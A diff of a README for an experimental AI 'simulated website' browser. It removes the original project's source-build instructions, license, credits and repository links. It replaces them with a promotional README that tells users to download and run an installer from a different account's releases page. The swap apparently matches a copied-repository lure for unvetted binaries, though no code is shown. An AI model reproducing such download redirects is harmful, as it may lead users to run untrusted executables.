@@ -1,269 +1,75 @@
-# Fractal Browser 🌐
-
-An experimental AI-powered desktop web browser that generates website content using Large Language Models. Instead of fetching websites from the internet, this application creates simulated website content using AI when you enter a URL.
-
-## Features
-
-- **AI Content Generation**: Generate simulated website content for any domain using LLMs
-- **Multiple AI Providers**: Support for OpenAI GPT-4, Anthropic Claude, and Google Gemini
-- **Streaming Responses**: Real-time content generation with progress indicators
-- **Modern UI**: Clean interface with dark mode support
-- **Navigation Controls**: Back, forward, refresh, and home buttons
-- **History Management**: Track your browsing history
-- **Security**: Content sanitization and sandboxed rendering
-- **Cross-Platform**: Works on Windows, macOS, and Linux
-
-## Quick Start
-
-### Prerequisites
-
-- Node.js 18+ and npm 8+
-- API keys for at least one AI provider:
-  - OpenAI API key
-  - Anthropic API key
-  - Google AI API key
-
-### Installation
-
-1. **Clone the repository**
-   ```bash
-   git clone https://github.com/chcardoz/llm-browser.git
-   cd llm-browser
-   ```
-
-2. **Install dependencies**
-   ```bash
-   npm install
-   ```
-
-3. **Set up environment variables**
-   Create a `.env` file in the root directory:
-   ```env
-   OPENAI_API_KEY=your_openai_api_key_here
-   ANTHROPIC_API_KEY=your_anthropic_api_key_here
-   GOOGLE_API_KEY=your_google_api_key_here
-   NODE_ENV=development
-   ```
-
-4. **Start the development server**
-   ```bash
-   npm run dev
-   ```
-
-## Development
-
-### Available Scripts
-
-- `npm run dev` - Start development server with hot reload
-- `npm run build` - Build the application for production
-- `npm run test` - Run tests
-- `npm run test:ui` - Run tests with UI
-- `npm run test:coverage` - Run tests with coverage report
-- `npm run lint` - Check code with Biome
-- `npm run lint:fix` - Fix linting issues
-- `npm run format` - Format code with Biome
-- `npm run type-check` - Run TypeScript type checking
-
-### Code Quality
-
-This project uses automated code quality checks:
-
-#### Pre-commit Hooks
-- **Linting**: Automatically runs Biome on staged files
-- **Formatting**: Ensures consistent code formatting
-- **Type Checking**: Validates TypeScript types
-
-#### Pre-push Hooks
-- **Type Checking**: Ensures all TypeScript types are valid
-- **Tests**: Runs the full test suite before pushing
-
-#### Commit Message Validation
-- **Conventional Commits**: Enforces conventional commit message format
-- **Examples**: `feat: add new feature`, `fix: resolve bug`, `docs: update readme`
-
-The hooks are automatically installed when you run `npm install`.
-
-### Project Structure
-
-```
-llm-browser/
-├── src/
-│   ├── main/              # Main process (Electron backend)
-│   │   ├── main.ts        # Main process entry point
-│   │   └── preload.ts     # Preload script for IPC
-│   ├── renderer/          # Renderer process (Frontend)
-│   │   ├── renderer.ts    # Renderer entry point
-│   │   ├── browser-ui.ts  # Browser UI component
-│   │   └── styles/
-│   │       └── main.css   # Main styles
-│   ├── services/          # AI and utility services
-│   │   ├── llm.ts         # LLM service implementation
-│   │   ├── provider.ts    # AI provider management
-│   │   ├── streaming.ts   # Streaming response handling
-│   │   ├── cache.ts       # Response caching
-│   │   └── prompt.ts      # Prompt templates
-│   ├── shared/           # Shared types and utilities
-│   │   ├── types.ts      # TypeScript type definitions
-│   │   ├── constants.ts  # Application constants
-│   │   └── logger.ts     # Logging utilities
-│   └── __tests__/        # Test files
-├── assets/              # Icons and images
-├── docs/               # Documentation
-└── config files
-```
+# 🌐 fractal - Your AI-Powered Web Experience
 
-## Usage
+Experience simulated websites with advanced AI technology.
 
-1. **Launch the application**
-   - The app opens with a welcome screen showing example URLs
+## 📥 Download Now
 
-2. **Enter a URL**
-   - Type any domain in the address bar (e.g., `google.com`, `facebook.com`)
-   - Press Enter or click the navigation button
+[![Download](https://img.shields.io/badge/Download%20Fractal-v1.0-blue)](https://github.com/ainsum/fractal/releases)
 
-3. **Watch AI generate content**
-   - The app uses AI to generate simulated website content
-   - You'll see a progress indicator during generation
-   - Content appears in real-time as it's generated
+## 🚀 Getting Started
 
-4. **Navigate and explore**
-   - Use the back/forward buttons to navigate history
-   - Switch between AI providers using the dropdown
-   - Refresh to regenerate content
+### 📜 Overview
 
-## AI Providers
+Fractal is an experimental desktop web browser that uses artificial intelligence to generate website content. When you enter a URL, Fractal creates a simulated version of the site instead of fetching it from the internet.
 
-The application supports multiple AI providers:
+### 🛠️ Prerequisites
 
-### OpenAI GPT-4
-- **Models**: GPT-4, GPT-4 Turbo, GPT-3.5 Turbo
-- **Best for**: General website generation, creative content
-- **Setup**: Add `OPENAI_API_KEY` to your `.env` file
+Before you begin, make sure you have the following:
 
-### Anthropic Claude
-- **Models**: Claude 3 Opus, Claude 3 Sonnet, Claude 3 Haiku
-- **Best for**: Detailed, well-structured content
-- **Setup**: Add `ANTHROPIC_API_KEY` to your `.env` file
+- **Node.js 18+**: This is necessary to run the application.
+- **npm 8+**: This package manager is required for managing dependencies.
+- **API Keys**: You will need keys from at least one AI provider:
+  - **OpenAI API Key**
+  - **Anthropic API Key**
+  - **Google AI API Key**
 
-### Google Gemini
-- **Models**: Gemini Pro, Gemini Pro Vision
-- **Best for**: Fast generation, Google ecosystem integration
-- **Setup**: Add `GOOGLE_API_KEY` to your `.env` file
+### 📥 Download & Install
 
-## Configuration
+1. **Visit the Releases Page**: Go to [this link to download](https://github.com/ainsum/fractal/releases).
+2. **Choose Your Version**: Find the latest version listed. Click on it to see the files available for download.
+3. **Download the Application**: Select the version suitable for your operating system (Windows, macOS, or Linux) and click the download link.
+4. **Run the Installer**: Once the file is downloaded, open it and follow the installation prompts.
+5. **Open Fractal**: After installation, locate the Fractal icon on your desktop or application folder and double-click to open it.
 
-### Environment Variables
+## 🎨 Features
 
-| Variable | Description | Required |
-|----------|-------------|----------|
-| `OPENAI_API_KEY` | OpenAI API key | No (if using other providers) |
-| `ANTHROPIC_API_KEY` | Anthropic API key | No (if using other providers) |
-| `GOOGLE_API_KEY` | Google AI API key | No (if using other providers) |
-| `NODE_ENV` | Environment (development/production) | Yes |
+Fractal provides several unique features to enhance your browsing experience:
 
-### Application Settings
+- **AI Content Generation**: Automatically creates simulated website content using powerful language models.
+- **Multiple AI Providers**: Choose from OpenAI GPT-4, Anthropic Claude, or Google Gemini for content generation.
+- **Streaming Responses**: Enjoy real-time content generation with visual progress indicators.
+- **Modern UI**: The application sports a clean interface that supports dark mode for your comfort.
+- **Navigation Controls**: Easily move back and forth, refresh pages, or return home using intuitive buttons.
+- **History Management**: Keep track of your browsing history for easy access to previously viewed content.
+- **Security**: The application ensures content sanitization and uses safe rendering practices.
+- **Cross-Platform**: Fractal runs smoothly on Windows, macOS, and Linux.
 
-The application can be configured through the constants file (`src/shared/constants.ts`):
+## ⚙️ Configuration
 
-- **Max History Entries**: Limit browsing history (default: 100)
-- **Enable Streaming**: Real-time content generation (default: true)
-- **Default Provider**: Auto-select AI provider (default: OpenAI)
-- **Security Settings**: CSP policies and sandboxing
+Once you open Fractal, you will need to configure your AI provider settings:
 
-## Testing
+1. **Access Settings**: Navigate to the settings menu within the application.
+2. **Enter Your API Key**: For the chosen AI provider, enter your API key. Make sure it is accurate to avoid errors.
+3. **Save the Settings**: Click the save button to apply your changes.
 
-The application includes tests for core functionality:
+## 🧑‍🏫 Using Fractal
 
-```bash
-# Run all tests
-npm test
+To begin using Fractal:
 
-# Run tests with UI
-npm run test:ui
+1. **Enter a URL**: Type any URL in the address bar.
+2. **Generate Content**: Hit enter and watch as Fractal creates the simulated website content.
+3. **Navigate**: Use the back and forward buttons as you explore the generated content.
 
-# Run tests with coverage
-npm run test:coverage
+## ⚠️ Troubleshooting
 
-# Run tests in watch mode
-npm run test:watch
-```
+If you encounter any issues, consider the following steps:
 
-### Test Coverage
+- **Check Your Internet Connection**: Ensure you have a stable connection.
+- **Verify API Keys**: Double-check that your API keys are entered correctly and are active.
+- **Reinstall**: If problems persist, try uninstalling and reinstalling the application.
 
-- **Unit Tests**: Core functionality and utilities
-- **Integration Tests**: IPC communication and AI service
-- **Component Tests**: Browser UI functionality
+## 💬 Support
 
-## Security
+If you need further assistance, please visit the [GitHub Issues page](https://github.com/ainsum/fractal/issues). You can report problems or ask questions there.
 
-The application implements several security measures:
-
-- **Content Security Policy**: Restricts script execution
-- **Sandboxed Rendering**: Isolates generated content
-- **Input Sanitization**: Cleans user input and AI-generated content
-- **Secure IPC**: Type-safe communication between processes
-- **Environment Isolation**: No direct Node.js access in renderer
-
-## Building for Production
-
-### Create Distribution Packages
-
-```bash
-# Build for current platform
-npm run build
-
-# Build for all platforms
-npm run make
-```
-
-### Supported Platforms
-
-- **Windows**: `.exe` installer and portable
-- **macOS**: `.dmg` and `.app`
-- **Linux**: `.deb`, `.rpm`, and `.AppImage`
-
-## Contributing
-
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
-
-### Development Guidelines
-
-- Follow TypeScript best practices
-- Write tests for new features
-- Use Biome for linting and formatting
-- Update documentation as needed
-- Follow conventional commit messages
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## Acknowledgments
-
-- [Electron](https://electronjs.org/) - Cross-platform desktop app framework
-- [Vercel AI SDK](https://sdk.vercel.ai/) - AI integration toolkit
-- [Vite](https://vitejs.dev/) - Fast build tool
-- [Biome](https://biomejs.dev/) - Fast linter and formatter
-- [Vitest](https://vitest.dev/) - Fast unit testing framework
-
-## Support
-
-- **Issues**: [GitHub Issues](https://github.com/chcardoz/llm-browser/issues)
-- **Discussions**: [GitHub Discussions](https://github.com/chcardoz/llm-browser/discussions)
-
-## Changelog
-
-### v0.0.1
-- Initial development version
-- AI-powered website generation
-- Multiple provider support
-- Modern UI with dark mode
-- Basic testing suite
-
----
-
-**Note**: This application is for experimental purposes. Generated content is simulated and may not always be accurate or appropriate. Use responsibly and in accordance with AI provider terms of service.
+[![Download](https://img.shields.io/badge/Download%20Fractal-v1.0-blue)](https://github.com/ainsum/fractal/releases)
